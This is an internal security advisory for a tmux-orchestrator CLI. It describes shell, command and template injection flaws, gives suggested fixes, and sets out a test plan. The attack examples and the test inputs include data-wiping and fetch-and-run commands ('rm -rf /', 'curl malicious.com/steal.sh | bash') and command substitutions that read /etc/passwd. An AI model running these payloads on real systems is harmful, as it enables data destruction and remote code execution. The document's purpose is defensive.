# CLI Security Blockers - Immediate Action Required

**Date**: 2025-08-14
**Target**: Senior Developer (CLI Completion Work)
**Priority**: CRITICAL - Must be resolved before CLI modernization completion
**Context**: Security vulnerabilities blocking CLI module completion

## 🚨 CRITICAL BLOCKERS - RESOLVE IMMEDIATELY

### 1. Shell Injection in Orchestrator Spawning (CRITICAL)
**File**: `tmux_orchestrator/cli/spawn_orc.py`
**Lines**: 46-77
**CVSS**: 9.8 (Critical) - Complete system compromise possible

#### **Vulnerable Code**:
```python
# Lines 46-77 - Direct string interpolation into bash script
startup_script = f"""#!/bin/bash
# ... setup code ...
{" ".join(claude_cmd)} "$INSTRUCTION_FILE"  # ⚠️ INJECTION POINT
# ... cleanup code ...
"""
```

#### **Attack Examples**:
```bash
tmux-orc spawn orc --profile '; rm -rf / #'
tmux-orc spawn orc --terminal 'xterm; curl malicious.com/steal.sh | bash'
```

#### **Required Fix**:
```python
import shlex

# SAFE VERSION - Use shlex.quote() for all user inputs
def create_safe_startup_script(claude_cmd: list[str], instruction_content: str) -> str:
    # Validate and escape each command component
    validated_cmd = []
    for arg in claude_cmd:
        if not isinstance(arg, str) or len(arg) > 1000:
            raise ValueError(f"Invalid command argument: {arg}")
        validated_cmd.append(shlex.quote(arg))

    safe_cmd = " ".join(validated_cmd)
    safe_instruction = shlex.quote(instruction_content)

    return f"""#!/bin/bash
set -euo pipefail
{safe_cmd} "$INSTRUCTION_FILE"
"""
```

#### **Input Validation**:
```python
def spawn_orc(profile: str | None, terminal: str, no_launch: bool, no_gui: bool) -> None:
    # Validate BEFORE using inputs
    if profile and not re.match(r'^[a-zA-Z0-9_-]+$', profile):
        raise click.BadParameter("Profile name contains invalid characters")

    if terminal != "auto" and not re.match(r'^[a-zA-Z0-9_-]+$', terminal):
        raise click.BadParameter("Terminal name contains invalid characters")
```

---

### 2. Agent Spawning Command Injection (HIGH)
**File**: `tmux_orchestrator/cli/spawn.py`
**Lines**: 102-314
**CVSS**: 7.5 (High) - Agent compromise possible

#### **Vulnerable Code**:
```python
# Lines 204-217 - Direct interpolation in daemon command
daemon_command = [
    sys.executable, "-c",
    f"""
import sys
sys.path.insert(0, '/workspaces/Tmux-Orchestrator')  # Hardcoded path
# ... more code ...
monitor._run_monitoring_daemon({interval})  # Direct interpolation
"""
]
```

#### **Required Fix**:
```python
from pydantic import BaseModel, Field, validator

class AgentSpawnRequest(BaseModel):
    name: str = Field(min_length=1, max_length=50)
    target: str = Field(regex=r"^[a-zA-Z0-9_-]+:\d+$")
    briefing: str = Field(min_length=1, max_length=10000)
    working_dir: Optional[Path] = None

    @validator('name')
    def validate_name(cls, v):
        if not re.match(r"^[a-zA-Z0-9_-]+$", v):
            raise ValueError("Name contains invalid characters")
        return v

    @validator('briefing')
    def validate_briefing(cls, v):
        # Block dangerous content
        dangerous_patterns = [
            r'subprocess\.|os\.|exec\(',
            r'__import__\(',
            r'eval\(|exec\(',
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, v, re.IGNORECASE):
                raise ValueError("Briefing contains dangerous pattern")
        return v

# Use validated data for spawning
def agent(name: str, target: str, briefing: str, working_dir: str = None):
    try:
        spawn_request = AgentSpawnRequest(
            name=name, target=target, briefing=briefing,
            working_dir=Path(working_dir) if working_dir else None
        )
        # Use spawn_request.name, spawn_request.briefing, etc.
    except ValidationError as e:
        console.print(f"[red]✗ Validation failed: {e}[/red]")
        raise click.Abort()
```

---

### 3. Team Composition Template Injection (MEDIUM)
**File**: `tmux_orchestrator/cli/team_compose.py`
**Lines**: 117-198, 352-415
**CVSS**: 6.0 (Medium) - Template injection possible

#### **Vulnerable Code**:
```python
# Lines 352-415 - Unsafe string replacement
template_name = Prompt.ask("Template name")  # No validation
content = template_content
content = content.replace("{Project Name}", project_name)  # No sanitization
```

#### **Required Fix**:
```python
import html

class TeamCompositionValidator:
    @staticmethod
    def validate_project_name(name: str) -> str:
        if not re.match(r'^[a-zA-Z0-9_-]+$', name):
            raise ValueError("Project name contains invalid characters")
        if len(name) > 50:
            raise ValueError("Project name too long")
        return name

    @staticmethod
    def sanitize_template_content(content: str, replacements: dict) -> str:
        safe_replacements = {}
        for key, value in replacements.items():
            # HTML escape and remove dangerous characters
            safe_value = html.escape(str(value))
            safe_value = re.sub(r'[<>"\'\\]', '', safe_value)
            safe_replacements[key] = safe_value

        result = content
        for placeholder, safe_value in safe_replacements.items():
            result = result.replace(f"{{{placeholder}}}", safe_value)
        return result
```

---

## 🔧 IMPLEMENTATION STRATEGY

### Phase 1: Immediate Fixes (Current CLI Work)
1. **spawn_orc.py security** (1-2 days)
   - Implement `shlex.quote()` for all user inputs
   - Add input validation with regex patterns
   - Create security test cases

2. **spawn.py validation** (1-2 days)
   - Implement Pydantic validation models
   - Add briefing content filtering
   - Validate working directory paths

3. **team_compose.py sanitization** (1 day)
   - Add project name validation
   - Implement safe template replacement
   - HTML escape all user inputs

### Phase 2: Testing & Validation (Parallel)
```python
# Add to test suite
def test_shell_injection_prevention():
    malicious_inputs = [
        "; rm -rf / #",
        "`cat /etc/passwd`",
        "$(whoami)",
        "profile; curl malicious.com/steal | bash"
    ]

    for malicious_input in malicious_inputs:
        with pytest.raises(click.BadParameter):
            spawn_orc(profile=malicious_input, terminal="auto",
                     no_launch=True, no_gui=False)
```

## 📋 INTEGRATION CHECKLIST

### Security Requirements (Must Complete)
- [ ] All user inputs validated with regex patterns
- [ ] Shell commands use `shlex.quote()` for escaping
- [ ] Pydantic models validate complex inputs
- [ ] HTML escaping for template content
- [ ] Security test cases added for injection vectors

### CLI Modernization Compatibility
- [ ] Maintain existing CLI interface contracts
- [ ] Preserve JSON output support where implemented
- [ ] Keep error message consistency
- [ ] Ensure backward compatibility for automation

### Pre-commit Integration
- [ ] Security fixes pass Bandit scanning
- [ ] Code formatting meets Ruff standards
- [ ] Type hints satisfy MyPy requirements

## 🎯 SUCCESS CRITERIA

**Security Validation**:
1. **Zero shell injection vulnerabilities** - All user inputs properly escaped
2. **Comprehensive input validation** - Pydantic models for complex inputs
3. **Template injection prevention** - HTML escaping and content sanitization

**CLI Completion Integration**:
1. **Security fixes integrated** into current CLI modernization work
2. **No breaking changes** to existing CLI interfaces
3. **Automated testing** for all security improvements

**Estimated Effort**: 4-5 days to complete security fixes alongside CLI modernization

This security-first approach ensures the CLI modernization work doesn't introduce production blockers while maintaining the architectural improvements already achieved.
